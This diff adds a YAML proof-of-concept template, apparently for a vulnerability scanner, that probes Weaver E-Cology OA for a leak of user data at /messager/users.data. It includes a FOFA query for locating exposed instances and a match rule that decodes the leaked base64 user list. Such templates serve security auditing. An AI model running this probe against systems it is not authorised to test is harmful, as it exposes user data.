@@ -1,0 +1,16 @@
+id: poc-yaml-weaver-e-cology-messager-users-info-leak
+info:
+  name: 泛微OA E-Cology /messager/users.data 信息泄漏漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 信息泄露
+  finger: e-cology
+  fofa: app="泛微-协同办公OA"
+requests:
+- method: GET
+  path: /messager/users.data
+  expression: status_code == 200 && !contains(body,"<") && len(body) > 15 && contains(base64_decode(body),"<users>")
+    && contains(base64_decode(body),"<id>")
+variables: {}
+transport: http
